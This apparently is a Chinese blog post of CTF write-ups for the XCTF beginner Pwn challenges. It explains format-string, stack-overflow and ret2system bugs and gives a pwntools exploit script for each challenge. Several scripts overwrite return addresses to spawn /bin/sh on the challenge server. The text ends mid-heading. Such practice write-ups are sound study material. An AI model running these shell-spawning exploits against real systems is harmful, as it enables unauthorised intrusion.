<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"><link rel="stylesheet" href="/css/main.css?v=7.1.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/xintiao_32.png?v=7.1.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/xintiao_16.png?v=7.1.0"><link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222"><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"7.1.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!1,fastclick:!1,lazyload:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta property="og:type" content="article"><meta property="og:title" content="攻防世界-Pwn"><meta property="og:url" content="http://liul14n.top/2019/08/08/攻防世界-Pwn/index.html"><meta property="og:site_name" content="LiuLian"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/24090.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809154336.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809160040.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809160209.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813211419.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809151750.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809151925.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153204.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153214.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153614.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153621.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153637.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153647.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153703.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809150446.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809150527.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809162816.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164259.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164648.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164749.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809181917.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173520.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173530.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173559.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173611.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170059.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170107.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170134.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170151.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170202.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164736.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164751.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164845.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813165250.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813165711.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814173615.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814173626.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1251324-20171126214819578-1152036283.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211046.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211117.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211151.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1251324-20171126215553468-1721731322.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/94.jpg"><meta property="og:updated_time" content="2020-02-28T16:07:17.759Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="攻防世界-Pwn"><meta name="twitter:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/24090.jpg"><link rel="canonical" href="http://liul14n.top/2019/08/08/攻防世界-Pwn/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>攻防世界-Pwn | LiuLian</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">LiuLian</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">58</span></a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://liul14n.top/2019/08/08/攻防世界-Pwn/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="LiuLian"><meta itemprop="description" content="Salute The Time"><meta itemprop="image" content="/images/touxiang.jpeg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="LiuLian"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">攻防世界-Pwn</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-08-08 15:54:47" itemprop="dateCreated datePublished" datetime="2019-08-08T15:54:47+08:00">2019-08-08</time> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-02-29 00:07:17" itemprop="dateModified" datetime="2020-02-29T00:07:17+08:00">2020-02-29</time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> 阅读次数： <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">41k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">35 分钟</span></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/24090.jpg" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33894740&auto=1&height=66"></iframe>- exp中所涉及的所有端口都要以题目中给的端口为准,攻防世界这个平台同一道题目。。不同时间来做的话,端口不一样。。。<h1 id="0x01-get-shell"><a href="#0x01-get-shell" class="headerlink" title="0x01 get_shell"></a>0x01 get_shell</h1><ul><li>纯新手题。</li><li>Linux系统 nc连接到题中给的地址,然后<code>cat flag</code>即可。</li></ul><h1 id="0x02-CGfsb"><a href="#0x02-CGfsb" class="headerlink" title="0x02 CGfsb"></a>0x02 CGfsb</h1><ul><li><p>考察格式化字符串漏洞。</p></li><li><p>emmm Freebuf上有很详细的格式化字符串漏洞原理及利用的讲解,链接如下。</p></li></ul><p><a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" title="Freebuf" target="_blank" rel="noopener">传送门</a></p><p><a href="https://www.anquanke.com/post/id/85785" title="安全客" target="_blank" rel="noopener">传送门</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809154336.png" alt></p><ul><li>这个具体偏移可以手动测出来。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809160040.png" alt></p><ul><li>测出来为10,所以exp中就用<code>%10$n</code>了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809160209.png" alt></p><ul><li><p>pwnme的地址在IDA中就能找出来,是<code>0x0804A068</code></p></li><li><p>所以exp为:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">"111.198.29.45"</span>,<span class="number">37724</span>)</span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'please tell me your name:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">"aaaa"</span>)<span class="comment">#这个随便输,但是输入需要小于等于10个字节。</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'leave your message please:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(p32(pwnme)+<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'%10$n'</span>)</span><br><span class="line"><span class="comment">#因为p32(pwnme)占4个字节, 而需要在%10$n前面输入8个字节,所以还需要补4个字节,所以加了4个a</span></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li>后来在看一篇文章的时候发现了一个点。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813211419.png" alt></p><ul><li>改进后的exp如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">33602</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'please tell me your name:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'a'</span>*<span class="number">8</span> +<span class="string">'%14$naaa'</span> +p32(pwnme))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-when-did-you-born"><a href="#0x03-when-did-you-born" class="headerlink" title="0x03 when_did_you_born"></a>0x03 when_did_you_born</h1><ul><li>考察栈溢出、变量覆盖。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809151750.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809151925.png" alt></p><ul><li><p>var_20 就是v4, var_18就是v5,他俩之间隔了8个字节。</p></li><li><p>根据逻辑,第一次我们输入一个不是1926的数字,然后通过危险函数<code>gets</code> 将读入的数据存入v4, 通过溢出来覆盖v5,让v5的值为1926从而<code>cat flag</code></p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">41955</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Birth?'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Name?'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">"a"</span>*<span class="number">8</span> + p32(<span class="number">1926</span>))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-hello-pwn"><a href="#0x04-hello-pwn" class="headerlink" title="0x04 hello_pwn"></a>0x04 hello_pwn</h1><ul><li>考察的和上一个题几乎一样。。。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153204.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153214.png" alt></p><ul><li><p>还是直接覆盖..</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">30278</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'lets get helloworld for bof'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x05-level0"><a href="#0x05-level0" class="headerlink" title="0x05 level0"></a>0x05 level0</h1><ul><li>考察栈溢出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153614.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153621.png" alt></p><ul><li>很明显的栈溢出</li><li>存在<code>/bin/sh</code>而且有被<code>system函数</code>调用</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153637.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153647.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809153703.png" alt></p><ul><li>所以 exp如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">34452</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400596</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x06-level2"><a href="#0x06-level2" class="headerlink" title="0x06 level2"></a>0x06 level2</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809150446.png" alt></p><ul><li>典型的栈溢出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809150527.png" alt></p><ul><li><p>存在<code>/bin/sh</code>但是没有调用。</p></li><li><p>存在<code>system函数</code>但是是用来<code>echo</code>一些信息的。</p></li><li><p>所以直接把<code>system函数</code>的参数修改成<code>/bin/sh</code>就好了。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">55974</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">sys_add = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">binsh_add = elf.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#也可以直接用上图中找到的0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(sys_add) + p32(<span class="number">0x0</span>) + p32(binsh_add)</span><br><span class="line"><span class="comment">#为什么payload是这个顺序请看下文。</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Input:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><ul><li>为什么payload是上面那个顺序？</li><li>答:</li></ul><blockquote><p>在32位程序运行中，函数参数直接压入栈中<br>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p></blockquote><blockquote><p>而在64位程序运行中，参数传递需要寄存器<br>64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中<br>参数超过六个时，从第七个开始压入栈中</p></blockquote><h1 id="0x07-guess-num"><a href="#0x07-guess-num" class="headerlink" title="0x07 guess_num"></a>0x07 guess_num</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809162816.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164259.png" alt></p><ul><li>var_30就是 v8, seed就是seed, 可以进行覆盖,间隔为0x20个字节。</li></ul><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ul><li><p>覆盖seed为1, 模拟执行srand(1),然后在exp中模拟得到v7的各值进行输入。</p></li><li><p>但是需要知道该程序的libc。</p></li><li><p>可以通过如下方法得到libc版本。</p></li></ul><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul><li>利用pwntools的ELF模块。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164648.png" alt></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><ul><li><code>ldd</code>命令。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809164749.png" alt></p><ul><li>思路一的exp如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">59620</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>) + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    c.recvuntil(<span class="string">'Please input your guess number:'</span>)</span><br><span class="line">    c.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ul><li>覆盖seed, 然后直接求出10次 <code>rand()%6+1</code>,得到如下输出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190809181917.png" alt></p><ul><li>exp如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54730</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>)+p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">L = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    c.recvuntil(<span class="string">'Please input your guess number:'</span>)</span><br><span class="line">    c.sendline(str(i))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x08-cgpwn2"><a href="#0x08-cgpwn2" class="headerlink" title="0x08 cgpwn2"></a>0x08 cgpwn2</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173520.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173530.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173559.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190812173611.png" alt></p><ul><li>观察字符串发现并没有<code>/bin/sh</code>,但是有对bss段的name的操作,可以通过将<code>/bin/sh</code>写入name,然后构造payload。</li></ul><blockquote><p>在32位程序调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p></blockquote><ul><li><p>所以随便找一个返回地址<code>0x0804854D</code></p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45942</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./cgpwn2'</span>)</span><br><span class="line"></span><br><span class="line">system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">bin_add = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">back = <span class="number">0x0804854D</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'please tell me your name'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(bin_sh)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'hello,you can leave some message here:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x26</span>+<span class="number">4</span>) + p32(system) + p32(back) + p32(bin_add)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x09-string"><a href="#0x09-string" class="headerlink" 